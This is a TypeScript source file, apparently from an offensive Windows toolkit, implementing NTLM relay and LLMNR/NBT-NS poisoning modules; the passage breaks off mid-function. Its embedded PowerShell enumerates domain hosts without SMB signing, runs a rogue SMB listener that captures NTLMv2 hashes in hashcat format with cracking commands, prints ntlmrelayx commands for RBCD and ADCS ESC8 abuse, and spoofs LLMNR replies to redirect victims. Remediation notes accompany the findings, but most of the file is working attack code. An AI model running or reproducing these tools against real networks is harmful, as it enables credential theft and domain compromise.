import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function ntlmRelay(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target")
  const relayTo = argVal(args, "--relay-to")
  const service = argVal(args, "--service") || "smb"
  const listenPort = argVal(args, "--listen-port") || "445"
  const findings: Finding[] = []
  const output: string[] = ["[*] NTLM relay attack toolkit...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== NTLM Relay (cmd.exe) ===\n")
    if (action === "enum" || action === "targets") {
      output.push("[*] Enumerating NTLM relay targets...")
      const netview = await cmd("net view /domain 2>nul", timeout)
      output.push(
        netview.stdout.trim()
          ? `[+] Domain computers:\n${netview.stdout}`
          : "[-] net view failed — try: net view /domain:<name>",
      )
      const arp = await cmd("arp -a", timeout)
      output.push(`\n[*] ARP table (live hosts):\n${arp.stdout}`)
      output.push("\n[*] SMB signing check (cmd limitation):")
      output.push("    cmd.exe cannot perform SMB negotiate — use nmap:")
      output.push("    nmap --script smb2-security-mode -p 445 <target>")
      output.push("    Or: CrackMapExec smb <target> --gen-relay-list relayable.txt")
      if (target) {
        const nbtstat = await cmd(`nbtstat -A ${target} 2>nul`, timeout)
        output.push(`\n[*] NetBIOS info for ${target}:\n${nbtstat.stdout}`)
      }
      findings.push({
        checkId: "WIN-RELAY-001",
        provider: "windows",
        severity: "medium",
        status: "ENUMERATED",
        resource: "network://ntlm-relay",
        title: "NTLM relay target enumeration via cmd.exe",
        details: "net view + arp scan — use external tools for SMB signing check",
        remediation: "Enable SMB signing on all systems. Disable NTLM where possible.",
      })
    }
    if (action === "check") {
      output.push("[*] Local NTLM relay mitigations:")
      const smb = await cmd(
        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v RequireSecuritySignature 2>nul',
        timeout,
      )
      const signing = smb.stdout.includes("0x1")
      output.push(
        signing ? "[+] SMB signing: REQUIRED (relay-protected)" : "[!] SMB signing: NOT required (relay-vulnerable)",
      )
      const ldap = await cmd(
        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" /v LdapServerIntegrity 2>nul',
        timeout,
      )
      output.push(ldap.stdout.includes("0x2") ? "[+] LDAP signing: REQUIRED" : "[!] LDAP signing: NOT required")
      const epa = await cmd(
        'reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v SuppressExtendedProtection 2>nul',
        timeout,
      )
      output.push(`[*] EPA status: ${epa.stdout.includes("0x0") ? "Enforced" : "Check manually"}`)
      if (!signing)
        findings.push({
          checkId: "WIN-RELAY-002",
          provider: "windows",
          severity: "high",
          status: "FAIL",
          resource: "SMB Signing",
          title: "SMB signing not required — relay attacks possible",
          details: "RequireSecuritySignature=0",
          remediation: "Enable SMB signing via GPO",
        })
    }
    if (action === "relay") {
      output.push("[!] Active NTLM relay requires external tools (cannot be done in cmd.exe)")
      output.push("[*] Relay tools:")
      output.push(`    ntlmrelayx.py -t ${relayTo || "<target>"} -smb2support`)
      output.push(`    ntlmrelayx.py -t ldap://${relayTo || "<dc>"} --delegate-access`)
      output.push("    Responder.py + ntlmrelayx.py (combined)")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum" || action === "targets") {
    const script = `
Write-Output "=== NTLM Relay Target Enumeration ==="
Write-Output ""
# Enumerate hosts — SMB signing via actual SMB negotiation
Write-Output "=== SMB Signing Status (via SMB Negotiate) ==="
$computers = @()
try {
  $searcher = New-Object DirectoryServices.DirectorySearcher
  $searcher.Filter = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
  $searcher.PageSize = 1000
  $searcher.PropertiesToLoad.AddRange(@("dNSHostName","operatingSystem"))
  $results = $searcher.FindAll()
  foreach ($r in $results) {
    $hn = $r.Properties["dnshostname"]
    $os = $r.Properties["operatingsystem"]
    if ($hn -and $hn.Count -gt 0) {
      $computers += @{Name=$hn[0]; OS=$(if ($os -and $os.Count -gt 0) {$os[0]} else {"Unknown"})}
    }
  }
} catch {
  Write-Output "Could not enumerate AD computers: $_"
}
Write-Output "Found $($computers.Count) domain computers"
Write-Output ""

# Real SMB signing check: send SMB1 Negotiate + parse SecurityMode flags
# SMB1 Negotiate packet (minimal)
$smbNeg = [byte[]]@(
  0x00, 0x00, 0x00, 0x2F,  # NetBIOS session (length=47)
  0xFF, 0x53, 0x4D, 0x42,  # SMB magic
  0x72,                      # Command: Negotiate
  0x00, 0x00, 0x00, 0x00,  # Status
  0x18,                      # Flags
  0x01, 0x28,                # Flags2
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Extra
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Extra
  0x00, 0x00,                # TID
  0x00, 0x00,                # PID
  0x00, 0x00,                # UID
  0x00, 0x00,                # MID
  0x00,                      # WordCount
  0x0C, 0x00,                # ByteCount = 12
  0x02, 0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00  # NT LM 0.12
)

$relayable = @()
$signingRequired = @()
$checked = 0
foreach ($c in ($computers | Select-Object -First 50)) {
  $name = $c.Name
  if (-not $name) { continue }
  $checked++
  try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect($name, 445)
    $stream = $tcp.GetStream()
    $stream.Write($smbNeg, 0, $smbNeg.Length)
    $stream.Flush()
    $buf = New-Object byte[] 256
    $stream.ReadTimeout = 3000
    $read = $stream.Read($buf, 0, 256)
    $tcp.Close()
    if ($read -gt 39) {
      # SecurityMode is at offset 39 in SMB1 Negotiate Response
      $secMode = $buf[39]
      # Bit 0x08 = signatures required, Bit 0x04 = signatures enabled
      $required = ($secMode -band 0x08) -ne 0
      $enabled = ($secMode -band 0x04) -ne 0
      if ($required) {
        $signingRequired += $name
        Write-Output "  $name ($($c.OS)) — signing REQUIRED"
      } elseif ($enabled) {
        $relayable += $name
        Write-Output "  $name ($($c.OS)) — signing supported but NOT required [RELAYABLE]"
      } else {
        $relayable += $name
        Write-Output "  $name ($($c.OS)) — signing DISABLED [RELAYABLE]"
      }
    }
  } catch {
    # Host unreachable or SMB not available
  }
  if ($checked % 10 -eq 0) { Write-Output "[*] Checked $checked hosts..." }
}
Write-Output ""
Write-Output "=== Results ==="
Write-Output "Checked: $checked hosts"
Write-Output "Relayable (signing not required): $($relayable.Count)"
Write-Output "Protected (signing required): $($signingRequired.Count)"
Write-Output ""
if ($relayable.Count -gt 0) {
  Write-Output "=== Relayable Targets ==="
  foreach ($r in $relayable) { Write-Output "  $r" }
}

Write-Output ""
Write-Output "=== LDAP Signing Check ==="
# Check domain-level LDAP signing policy via GPO registry
$ldapClientSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\ldap" -Name "LDAPClientIntegrity" -ErrorAction SilentlyContinue).LDAPClientIntegrity
$ldapServerSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
$ldapChannelBinding = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
Write-Output "LDAP Client Signing: $(switch($ldapClientSigning) {0 {'None'} 1 {'Negotiate (default)'} 2 {'Required'} default {'Not set (default=Negotiate)'}})"
Write-Output "LDAP Server Signing: $(switch($ldapServerSigning) {0 {'None'} 1 {'Negotiate'} 2 {'Required'} default {'Not set'}})"
Write-Output "Channel Binding: $(switch($ldapChannelBinding) {0 {'Never'} 1 {'When supported'} 2 {'Always'} default {'Not set (default=Never)'}})"
if ($ldapServerSigning -ne 2) {
  Write-Output "STATUS: LDAP relay possible — server signing not required"
}
if (-not $ldapChannelBinding -or $ldapChannelBinding -lt 2) {
  Write-Output "STATUS: LDAP channel binding not enforced — cross-protocol relay possible"
}

Write-Output ""
Write-Output "=== HTTP Relay Targets ==="
# Scan for common HTTP services that accept NTLM
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
$httpTargets = @()
foreach ($c in ($computers | Select-Object -First 20)) {
  foreach ($port in @(80, 443, 8080, 5985)) {
    try {
      $tcp = New-Object System.Net.Sockets.TcpClient
      $tcp.Connect($c.Name, $port)
      $tcp.Close()
      Write-Output "  $($c.Name):$port OPEN"
      $httpTargets += "$($c.Name):$port"
    } catch {}
  }
}
# Check for ADCS web enrollment (high-value relay target)
$searcher.SearchRoot = [ADSI]"LDAP://$(([ADSI]'LDAP://RootDSE').configurationNamingContext)"
$searcher.Filter = "(objectClass=pKIEnrollmentService)"
$cas = $searcher.FindAll()
if ($cas.Count -gt 0) {
  Write-Output ""
  Write-Output "=== ADCS Certificate Authorities (ESC8 relay target) ==="
  foreach ($ca in $cas) {
    $caName = $ca.Properties["cn"][0]
    $caHost = $ca.Properties["dnshostname"]
    Write-Output "  CA: $caName $(if ($caHost) {"on $($caHost[0])"})"
    Write-Output "  Web enrollment: https://$($caHost[0])/certsrv/"
    Write-Output "  [!] Relay NTLM to /certsrv/certfnsh.asp for ESC8 certificate request"
  }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    const relayableMatch = r.stdout.match(/Count: (\d+)/)
    if (relayableMatch && parseInt(relayableMatch[1]) > 0) {
      findings.push({
        checkId: "RELAY-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "Domain Computers",
        title: `${relayableMatch[1]} hosts with SMB signing not required`,
        details:
          "These hosts can be targeted for NTLM relay attacks — captured NTLM auth can be relayed to create sessions",
        remediation:
          "Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options.",
      })
    }
    if (r.stdout.includes("LDAP relay possible")) {
      findings.push({
        checkId: "RELAY-002",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "Domain Controller LDAP",
        title: "LDAP signing not required — LDAP relay possible",
        details: "NTLM auth can be relayed to LDAP for RBCD, shadow credentials, or ACL modification",
        remediation: "Set 'Domain controller: LDAP server signing requirements' to 'Require signing' in GPO.",
      })
    }
  }

  if (action === "check") {
    const targetHost = target || "localhost"
    const script = `
Write-Output "=== NTLM Relay Protection Check: ${targetHost} ==="
Write-Output ""
# SMB signing
Write-Output "--- SMB Signing ---"
try {
  $tcp = New-Object System.Net.Sockets.TcpClient
  $tcp.Connect('${targetHost}', 445)
  $tcp.Close()
  Write-Output "SMB port 445: OPEN"
  # Check via registry if local
  if ('${targetHost}' -match 'localhost|127.0.0.1') {
    $reqSign = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters" -Name RequireSecuritySignature -ErrorAction SilentlyContinue).RequireSecuritySignature
    Write-Output "RequireSecuritySignature: $(if ($reqSign -eq 1) {'REQUIRED (relay blocked)'} else {'NOT required (relay possible)'})"
  }
} catch {
  Write-Output "SMB port 445: CLOSED"
}
# LDAP signing
Write-Output ""
Write-Output "--- LDAP Signing ---"
try {
  $tcp = New-Object System.Net.Sockets.TcpClient
  $tcp.Connect('${targetHost}', 389)
  $tcp.Close()
  Write-Output "LDAP port 389: OPEN"
} catch {
  Write-Output "LDAP port 389: CLOSED"
}
# EPA (Extended Protection for Authentication)
Write-Output ""
Write-Output "--- HTTP/EPA ---"
foreach ($port in @(80, 443, 8080, 8443, 5985)) {
  try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect('${targetHost}', $port)
    $tcp.Close()
    Write-Output "HTTP port $port OPEN — check EPA/channel binding"
  } catch {}
}
# MSSQL
Write-Output ""
Write-Output "--- MSSQL ---"
try {
  $tcp = New-Object System.Net.Sockets.TcpClient
  $tcp.Connect('${targetHost}', 1433)
  $tcp.Close()
  Write-Output "MSSQL port 1433: OPEN — EPA check needed"
} catch {
  Write-Output "MSSQL port 1433: CLOSED"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  if (action === "relay") {
    const script = `
Write-Output "=== NTLM Hash Capture Server ==="
Write-Output "Listen port: ${listenPort}"
Write-Output ""
Write-Output "NOTE: Pure PowerShell cannot perform real NTLM relay (Type1/2/3 message"
Write-Output "forwarding requires raw socket manipulation of NTLM challenge/response)."
Write-Output "This listener CAPTURES NTLMv2 hashes in hashcat/john format for cracking."
Write-Output "For actual relay, use impacket ntlmrelayx after capturing target info."
Write-Output ""

$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress

# SMB hash capture via raw socket on port 445
Write-Output "[*] Starting SMB capture server on $ourIP :${listenPort}..."
Write-Output ""
Write-Output "Trigger auth:"
Write-Output "  winhook ntlm_coerce --target VICTIM --listener $ourIP"
Write-Output "  winhook coercer_full --target VICTIM --listener $ourIP"
Write-Output "  dir \\\\$ourIP\\share  (from victim)"
Write-Output ""

$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, ${listenPort})
try {
  $listener.Start()
  Write-Output "[*] Listening for SMB connections..."
  $captured = @()
  $deadline = (Get-Date).AddSeconds(120)

  while ((Get-Date) -lt $deadline) {
    if (-not $listener.Pending()) { Start-Sleep -Milliseconds 200; continue }
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    $stream.ReadTimeout = 5000

    try {
      # Read NetBIOS + SMB Negotiate
      $buf = New-Object byte[] 4096
      $read = $stream.Read($buf, 0, 4096)
      if ($read -lt 36) { $client.Close(); continue }

      # Check for SMB1 or SMB2
      $isSMB2 = ($buf[4] -eq 0xFE -and $buf[5] -eq 0x53)
      $isSMB1 = ($buf[4] -eq 0xFF -and $buf[5] -eq 0x53)

      if ($isSMB1 -and $buf[8] -eq 0x72) {
        # SMB1 Negotiate — respond with NTLM challenge
        $challenge = [byte[]](1..8 | ForEach-Object { Get-Random -Maximum 256 })
        $challengeHex = ($challenge | ForEach-Object { '{0:X2}' -f $_ }) -join ''

        # Build SMB1 Negotiate Response with NTLMSSP challenge
        # SecurityMode: signing enabled but not required
        $negResp = [byte[]]@(
          0x00, 0x00, 0x00, 0x00,  # NetBIOS (patched below)
          0xFF, 0x53, 0x4D, 0x42,  # SMB magic
          0x72,                      # Negotiate
          0x00, 0x00, 0x00, 0x00,  # Status OK
          0x98,                      # Flags
          0x01, 0x28,                # Flags2 (Unicode + NTLMSSP)
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
          0x00, 0x00, 0x00, 0x00,
          0x11,                      # WordCount = 17
          0x00, 0x00,                # DialectIndex = 0
          0x03,                      # SecurityMode (signing enabled, not required)
          0x32, 0x00,                # MaxMpx
          0x01, 0x00,                # MaxVCs
          0x04, 0x41, 0x00, 0x00,  # MaxBufferSize
          0x00, 0x00, 0x01, 0x00,  # MaxRawSize
          0x00, 0x00, 0x00, 0x00,  # SessionKey
          0xFD, 0xE3, 0x00, 0x00,  # Capabilities (NTLMSSP)
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # SystemTime
          0x00, 0x00,                # ServerTimeZone
          0x00,                      # ChallengeLength = 0 (Extended Security)
          0x10, 0x00                 # ByteCount = 16
        )
        # Append NTLMSSP OID
        $ntlmsspOID = [byte[]]@(0x60, 0x0E, 0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02, 0xA0, 0x04, 0x30, 0x02, 0xA0, 0x00)
        $fullResp = $negResp + $ntlmsspOID
        $fullResp[3] = [byte]($fullResp.Length - 4)
        $stream.Write($fullResp, 0, $fullResp.Length)
        $stream.Flush()

        # Read Session Setup with NTLMSSP Authenticate
        $read2 = $stream.Read($buf, 0, 4096)
        if ($read2 -gt 0) {
          $raw = $buf[0..$read2]
          $rawHex = [BitConverter]::ToString($raw) -replace '-',''
          # Find NTLMSSP signature (4E544C4D53535000)
          $ntlmIdx = $rawHex.IndexOf('4E544C4D53535000')
          if ($ntlmIdx -ge 0) {
            $msgType = $raw[($ntlmIdx/2 + 8)]
            if ($msgType -eq 3) {
              # Type 3 — extract NTLMv2 response
              $ntlmBase = $ntlmIdx / 2
              $lmLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 12)
              $lmOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 16)
              $ntLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 20)
              $ntOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 24)
              $domLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 28)
              $domOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 32)
              $userLen = [BitConverter]::ToUInt16($raw, $ntlmBase + 36)
              $userOff = [BitConverter]::ToUInt32($raw, $ntlmBase + 40)

              $domain = [System.Text.Encoding]::Unicode.GetString($raw, $ntlmBase + $domOff, $domLen)
              $username = [System.Text.Encoding]::Unicode.GetString($raw, $ntlmBase + $userOff, $userLen)

              if ($ntLen -gt 24) {
                # NTLMv2
                $ntProof = ($raw[($ntlmBase + $ntOff)..($ntlmBase + $ntOff + 15)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                $ntBlob = ($raw[($ntlmBase + $ntOff + 16)..($ntlmBase + $ntOff + $ntLen - 1)] | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                $hashLine = "$username" + "::" + "$domain" + ":" + "$challengeHex" + ":" + "$ntProof" + ":" + "$ntBlob"
                Write-Output ""
                Write-Output "[+] NTLMv2 HASH CAPTURED!"
                Write-Output "  User: $domain\\$username"
                Write-Output "  Challenge: $challengeHex"
                Write-Output ""
                Write-Output "  Hashcat format (mode 5600):"
                Write-Output "  $hashLine"
                Write-Output ""
                Write-Output "  Crack: hashcat -m 5600 hash.txt wordlist.txt"
                Write-Output "  John:  john --format=netntlmv2 hash.txt"
                $captured += $hashLine
              }
            }
          }
        }
      }
    } catch {}
    $client.Close()
    if ($captured.Count -gt 0) { break }
  }

  Write-Output ""
  Write-Output "=== Capture Summary ==="
  Write-Output "Hashes captured: $($captured.Count)"
} catch {
  Write-Output "ERROR: $_"
  if ($_.Exception.Message -match 'access') {
    Write-Output "Port ${listenPort} requires admin. Try: --listen-port 8445"
  }
} finally {
  $listener.Stop()
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (relayTo) {
      output.push("\n=== Relay Commands (use impacket) ===")
      output.push("For actual NTLM relay to " + relayTo + ", use:")
      output.push("  ntlmrelayx.py -t " + service + "://" + relayTo + " -smb2support")
      output.push("  ntlmrelayx.py -t ldaps://" + relayTo + " --delegate-access  # RBCD")
      output.push("  ntlmrelayx.py -t http://" + relayTo + "/certsrv/certfnsh.asp --adcs  # ESC8")
    }
    const hashMatches = r.stdout.match(/NTLMv2 HASH CAPTURED/g) || []
    if (hashMatches.length > 0) {
      findings.push({
        checkId: "RELAY-003",
        provider: "winhook",
        severity: "critical",
        status: "FAIL",
        resource: "NTLM",
        title: hashMatches.length + " NTLMv2 hash(es) captured",
        details: "NTLMv2 challenge/response hashes captured in hashcat format (mode 5600)",
        remediation: "Enable SMB signing, disable NTLM authentication via GPO.",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function responderPoison(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "check"
  const iface = argVal(args, "--interface")
  const duration = argVal(args, "--duration") || "120"
  const protocols = argVal(args, "--protocols") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] LLMNR/NBT-NS/mDNS poisoning toolkit...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    output.push("=== LLMNR/NBT-NS Poisoning (cmd.exe) ===\n")
    if (action === "check") {
      output.push("[*] Checking broadcast poisoning opportunities...")
      const llmnr = await cmd(
        'reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" /v EnableMulticast 2>nul',
        timeout,
      )
      output.push(
        llmnr.stdout.includes("0x0") ? "[+] LLMNR: DISABLED via GPO" : "[!] LLMNR: ENABLED — poisoning possible",
      )
      const nbtns = await cmd("nbtstat -n", timeout)
      output.push(`\n[*] NetBIOS names:\n${nbtns.stdout}`)
      const mdns = await cmd("netsh interface ip show dns", timeout)
      output.push(`\n[*] DNS config:\n${mdns.stdout}`)
      const ipconfig = await cmd("ipconfig /all", timeout)
      const dnsServers = ipconfig.stdout.match(/DNS Servers.*:(.+)/g) || []
      output.push(`\n[*] DNS servers:\n${dnsServers.map((d) => `    ${d}`).join("\n")}`)
      output.push("\n[*] Network interfaces:")
      const ifaces = await cmd("ipconfig", timeout)
      output.push(ifaces.stdout)
      if (!llmnr.stdout.includes("0x0"))
        findings.push({
          checkId: "WIN-POISON-001",
          provider: "windows",
          severity: "high",
          status: "FAIL",
          resource: "network://llmnr",
          title: "LLMNR enabled — broadcast poisoning possible",
          details: "LLMNR not disabled via GPO",
          remediation:
            "Disable LLMNR via GPO: Computer Config > Admin Templates > Network > DNS Client > Turn Off Multicast",
        })
    }
    if (action === "poison" || action === "analyze") {
      output.push("[!] Active poisoning requires external tools:")
      output.push("    Responder.py -I <interface> -wrf")
      output.push("    Inveigh.exe (Windows native, .NET)")
      output.push("    mitm6 (IPv6 DNS takeover)")
      output.push("\n[*] Capture hashes then crack:")
      output.push("    hashcat -m 5600 hashes.txt wordlist.txt (NetNTLMv2)")
      output.push("    hashcat -m 5500 hashes.txt wordlist.txt (NetNTLMv1)")
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "check") {
    const script = `
Write-Output "=== Broadcast Poisoning Opportunity Assessment ==="
Write-Output ""
# Check LLMNR status
Write-Output "--- LLMNR (Link-Local Multicast Name Resolution) ---"
$llmnrDisabled = (Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient" -Name EnableMulticast -ErrorAction SilentlyContinue).EnableMulticast
if ($llmnrDisabled -eq 0) {
  Write-Output "LLMNR: DISABLED via GPO (poisoning not possible for this host)"
} else {
  Write-Output "LLMNR: ENABLED — this host will respond to and make LLMNR queries"
  Write-Output "  Multicast group: 224.0.0.252:5355"
}
# Check NBT-NS status
Write-Output ""
Write-Output "--- NBT-NS (NetBIOS Name Service) ---"
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled }
foreach ($a in $adapters) {
  $nbtns = if ($a.TcpipNetbiosOptions -eq 2) { "DISABLED" } elseif ($a.TcpipNetbiosOptions -eq 1) { "ENABLED" } else { "DEFAULT (DHCP-dependent)" }
  Write-Output "  $($a.Description): NBT-NS $nbtns"
}
# Check mDNS status (Windows 10+)
Write-Output ""
Write-Output "--- mDNS (Multicast DNS) ---"
$mdnsDisabled = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Dnscache\\Parameters" -Name EnableMDNS -ErrorAction SilentlyContinue).EnableMDNS
if ($mdnsDisabled -eq 0) {
  Write-Output "mDNS: DISABLED"
} else {
  Write-Output "mDNS: ENABLED — multicast DNS queries on 224.0.0.251:5353"
}
# Check WPAD
Write-Output ""
Write-Output "--- WPAD (Web Proxy Auto-Discovery) ---"
$wpadDisabled = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WinHttpAutoProxySvc" -Name Start -ErrorAction SilentlyContinue).Start
Write-Output "WPAD Service: $(if ($wpadDisabled -eq 4) {'DISABLED'} else {'ENABLED — WPAD poisoning possible'})"
# Network info
Write-Output ""
Write-Output "--- Network Context ---"
$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' }
foreach ($ip in $ips) {
  Write-Output "  $($ip.InterfaceAlias): $($ip.IPAddress)/$($ip.PrefixLength)"
}
Write-Output ""
Write-Output "--- DNS Suffix Search List ---"
$dnsConfig = Get-DnsClientGlobalSetting
Write-Output "  Suffixes: $($dnsConfig.SuffixSearchList -join ', ')"
Write-Output ""
Write-Output "--- Assessment ---"
$vulnCount = 0
if ($llmnrDisabled -ne 0) { $vulnCount++; Write-Output "[!] LLMNR enabled — poisoning possible" }
if ($mdnsDisabled -ne 0) { $vulnCount++; Write-Output "[!] mDNS enabled — poisoning possible" }
$nbtEnabled = $adapters | Where-Object { $_.TcpipNetbiosOptions -ne 2 }
if ($nbtEnabled) { $vulnCount++; Write-Output "[!] NBT-NS enabled on $($nbtEnabled.Count) adapters — poisoning possible" }
if ($wpadDisabled -ne 4) { $vulnCount++; Write-Output "[!] WPAD enabled — proxy poisoning possible" }
if ($vulnCount -eq 0) { Write-Output "[*] All broadcast name resolution protocols disabled — poisoning not viable" }
else { Write-Output "[+] $vulnCount protocol(s) available for poisoning" }
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (
      r.stdout.includes("LLMNR enabled") ||
      r.stdout.includes("NBT-NS enabled") ||
      r.stdout.includes("mDNS enabled")
    ) {
      findings.push({
        checkId: "POISON-001",
        provider: "winhook",
        severity: "high",
        status: "FAIL",
        resource: "Network Configuration",
        title: "Broadcast name resolution protocols enabled — poisoning possible",
        details: r.stdout.substring(r.stdout.indexOf("--- Assessment ---"), r.stdout.length),
        remediation: "Disable LLMNR via GPO, disable NBT-NS per adapter, disable mDNS via registry.",
      })
    }
  }

  if (action === "poison") {
    const script = `
Write-Output "=== Starting Broadcast Poisoner ==="
Write-Output "Duration: ${duration} seconds"
Write-Output "Protocols: ${protocols}"
Write-Output ""

$startTime = Get-Date
$queryCount = 0
$poisonedCount = 0
$ourIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress
$ipBytes = [System.Net.IPAddress]::Parse($ourIP).GetAddressBytes()
$llmnrSocket = $null

# LLMNR Listener (UDP 5355, multicast 224.0.0.252)
# Must use ReuseAddress BEFORE binding, and join multicast group
if ('${protocols}' -match 'llmnr|all') {
  Write-Output "[*] Starting LLMNR poisoner on 224.0.0.252:5355..."
  try {
    $ep = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 5355)
    $llmnrSocket = New-Object System.Net.Sockets.UdpClient
    $llmnrSocket.Client.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
    $llmnrSocket.ExclusiveAddressUse = $false
    $llmnrSocket.Client.Bind($ep)
    $llmnrSocket.JoinMulticastGroup([System.Net.IPAddress]::Parse("224.0.0.252"))
    $llmnrSocket.Client.ReceiveTimeout = 1000
    Write-Output "  LLMNR listener active (poisoning $ourIP)"
  } catch {
    Write-Output "  LLMNR bind failed: $_"
    Write-Output "  Try stopping Windows LLMNR: Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows' NT'\\DNSClient -Name EnableMulticast -Value 0"
    $llmnrSocket = $null
  }
}

# NBT-NS: Port 137 is held by Windows NetBIOS service — cannot bind.
# Instead, passively monitor NBT-NS traffic via packet sniffing if possible.
if ('${protocols}' -match 'nbtns|all') {
  Write-Output "[*] NBT-NS (port 137): passive monitoring only"
  Write-Output "  Port 137 is held by Windows NetBIOS service — active poisoning requires"
  Write-Output "  stopping NetBIOS: sc stop NetBT (may break network connectivity)"
  Write-Output "  For active NBT-NS poisoning, use Inveigh from an elevated PS session"
}

Write-Output ""
Write-Output "[*] Listening for LLMNR queries to poison..."
Write-Output "[*] Responding with: $ourIP"
Write-Output "[*] Duration: ${duration}s"
Write-Output ""

while ((New-TimeSpan -Start $startTime -End (Get-Date)).TotalSeconds -lt ${duration}) {
  if ($llmnrSocket) {
    try {
      $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
      $data = $llmnrSocket.Receive([ref]$remoteEP)

      # Skip our own responses and packets < minimum LLMNR size
      if ($data.Length -lt 13) { continue }
      if ($remoteEP.Address.ToString() -eq $ourIP) { continue }

      # Parse LLMNR header (same as DNS)
      # Bytes 2-3: Flags — bit 15 is QR (0=query, 1=response)
      $isQuery = ($data[2] -band 0x80) -eq 0
      if (-not $isQuery) { continue }

      # Extract queried name: starts at byte 12, length-prefixed label
      $nameLen = $data[12]
      if ($nameLen -eq 0 -or (13 + $nameLen) -gt $data.Length) { continue }
      $queriedName = [System.Text.Encoding]::ASCII.GetString($data, 13, $nameLen)
      $queryCount++
      Write-Output "[+] LLMNR Query from $($remoteEP.Address): $queriedName"

      # Build proper LLMNR response
      # Header: same TXID, QR=1 (response), QDCOUNT=1, ANCOUNT=1
      $resp = New-Object System.Collections.Generic.List[byte]
      $resp.Add($data[0])  # TXID byte 1
      $resp.Add($data[1])  # TXID byte 2
      $resp.Add(0x80)      # Flags: QR=1 (response)
      $resp.Add(0x00)      # Flags byte 2
      $resp.Add(0x00); $resp.Add(0x01)  # QDCOUNT = 1
      $resp.Add(0x00); $resp.Add(0x01)  # ANCOUNT = 1
      $resp.Add(0x00); $resp.Add(0x00)  # NSCOUNT = 0
      $resp.Add(0x00); $resp.Add(0x00)  # ARCOUNT = 0

      # Question section — echo the original query verbatim
      # Question = name labels + QTYPE(2) + QCLASS(2)
      $questionStart = 12
      $questionEnd = $data.Length - 1
      for ($i = $questionStart; $i -le $questionEnd; $i++) {
        $resp.Add($data[$i])
      }

      # Answer section: same name + TYPE(A) + CLASS(IN) + TTL(30s) + RDLEN(4) + IP
      # Re-encode the name for the answer
      $resp.Add($nameLen)
      for ($i = 0; $i -lt $nameLen; $i++) {
        $resp.Add($data[13 + $i])
      }
      $resp.Add(0x00)      # Name terminator
